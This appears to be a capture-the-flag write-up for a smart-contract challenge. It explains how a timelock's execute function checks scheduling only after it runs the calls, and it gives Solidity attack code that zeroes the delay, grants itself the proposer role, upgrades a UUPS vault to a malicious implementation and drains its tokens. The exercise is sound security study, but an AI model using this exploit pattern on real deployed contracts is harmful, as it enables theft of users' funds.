there is a vault, which is UUPSUpgradeable
sweeper address instance, Initializer function inherited.

owner of the vault contract is timelock, can withdraw a limited amount of tokens every 15 days.
in the timelock contract, account with proposer role can schedule actions that can be executed 1 hour later. 

1. withdraw method: only owner can call this, amount should be less than withdrawal limit, there is a waiting period.
2. sweepFunds can only be called by the sweeper address, and it can transfer all the funds to the sweeper address.

ClimberTimelock contract: admin roles, proposer roles
1. proposer can call schedule method, which checks the target params and data, and update the mapping for the scheduled action/operation.
2. updateDelay function is used to update the delay time (state variable), external, can be called by timelock contract only!!
3. execute function: anyone can call this functio and execute what is scheduled. it checks params, length, get the operation id, calls each target with data and value and then checks the operation state using the id and see if it is ready for execution or not. there are no checks of action against the scheduled actions (it is done after the call). 

hack idea:
- the timelock has an issue with the execute function, we can make calls and then schedule the same operation in a single txn and this way the final state check passes retroactvely.
- first we make call to update delay period to zero
- from timelock we give access to this proposer role to the attacker contract so we can schedule the operations with this roles
- then we call the vault contract and upgrade itself and the new implementation will be attacker contract, upgrade to attacker contract (mal vault) and then call the drain method which sweeps funds to recovery address
- at last create the schedule call in the same transaction and this way the final state check will pass.

```

    function attack() external {
        salt = keccak256("attack");

        // ? step-1: update the delay period in timelock to zero, this method can be called by the timelock contract only
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0))));

        // ? step-2: grant proposer role to the attacker contract, this method can be called by the timelock contract only. Proposer can create a scheduled operation in timelock
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));

        // ? step-3
        targets.push(address(vault));
        values.push(0);
        // function upgradeToAndCall(address newImplementation, bytes memory data)
        // ^ this is UUPS method, can be called by proxy only (vault in this case)
        // Changing new implementation to this contract and data is call drain method in this contract to sweep all funds to the recovery address
        dataElements.push(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(this),
                abi.encodeCall(Attacker.drain, (address(token), recovery))
            )
        );

        // ? step-4: schedule the operation using the attacker contract, this method can be called by the proposer role accounts
        // due the wrong execute method we can execute first and later schedule and do this in the same transaction and the final state check will pass retroactively
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeCall(Attacker.schedule, ()));

        // ? step-5:  call the execute function in the main (vulnerable) timelock contract.
        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() external {
        // console.log("Scheduling operation...");
        timelock.schedule(targets, values, dataElements, salt);
    }

    function drain(address tokenAddr, address receiver) external {
        DamnValuableToken _token = DamnValuableToken(tokenAddr);
        _token.transfer(receiver, _token.balanceOf(address(this)));
    }
```